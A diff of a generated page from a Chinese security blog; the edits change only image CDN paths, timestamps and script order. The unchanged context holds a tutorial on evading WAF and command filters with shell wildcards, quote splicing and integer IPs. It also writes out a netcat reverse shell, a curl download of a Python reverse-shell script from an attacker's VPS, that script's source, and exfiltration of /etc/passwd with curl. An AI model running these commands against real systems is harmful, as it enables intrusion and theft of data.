@@ -23,18 +23,18 @@
 <meta property="og:site_name" content="Lonely Sit&#39;s Security Haven">
 <meta property="og:description" content="使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-22.png">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-23.png">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-24.png">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-25.png">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-26.png">
-<meta property="og:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-27.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png">
+<meta property="og:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png">
 <meta property="article:published_time" content="2023-07-22T04:35:28.000Z">
-<meta property="article:modified_time" content="2024-01-15T03:50:00.750Z">
+<meta property="article:modified_time" content="2024-01-16T04:52:56.936Z">
 <meta property="article:author" content="Lonely Sit">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-22.png">
+<meta name="twitter:image" content="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png">
   <link rel="stylesheet" href="https://lib.baomitu.com/highlight.js/9.15.8/styles/atom-one-dark.min.css" crossorigin>
   <link rel="stylesheet" href="/lib/mdui_043tiny/css/mdui.css">
   <link rel="stylesheet" href="/lib/iconfont/iconfont.css">
@@ -43,7 +43,7 @@
   
     <link rel="stylesheet" href="//at.alicdn.com/t/font_2421060_8z08qcz5sq3.css">
   
-  <link rel="stylesheet" href="/css/style.css?v=1705291119970">
+  <link rel="stylesheet" href="/css/style.css?v=1705381041153">
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -326,12 +326,12 @@
 <p>使用通配符绕过防火墙规则</p>
 <p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
 <p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片" class="lazyload"></p>
 <p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
 <p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
 <p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
 <p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片" class="lazyload"></p>
 <p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
 <p>使用字符串拼接绕过防火墙规则</p>
 <p>连接字符串的操作符主要有以下几种</p>
@@ -349,10 +349,10 @@
 <p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
 <p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
 <p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片" class="lazyload"></p>
 <p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
 <p>curl -v “<a target="_blank" rel="noopener" href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片" class="lazyload"></p>
 <p>shell.py 代码如下</p>
 <p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
 <p>import socket,subprocess,os</p>
@@ -364,7 +364,7 @@
 <p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
 <p>提前在你的VPS上用nc侦听一个端口</p>
 <p>nc -lvp [port]</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片" class="lazyload"></p>
 <p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
 <p>curl -v “<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
 <p>curl -v “<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
@@ -389,7 +389,7 @@
 <p>例如</p>
 <p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
 <p># 在本地侦听8888端口即可接受到数据</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/gh/Lonely-Sit/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片" class="lazyload"></p>
 
         </article>
 
@@ -1107,7 +1107,7 @@
 <script src="/lib/fancybox/js/jquery.fancybox.min.js"></script>
 
 
-<script src="/js/app.js?v=1705291119971"></script>
+<script src="/js/app.js?v=1705381041154"></script>
 
 <script src="https://lib.baomitu.com/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
 <script>
@@ -1156,11 +1156,11 @@
 
 <link rel="stylesheet" href="/lib/codeBlock/matery.css">
 
-<script src="/js/webapp.js"></script>
-
 <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
 
 <script src="/js/search.js"></script>
+
+<script src="/js/webapp.js"></script>
 <!-- hexo injector body_end end --></body>
 </html>
 
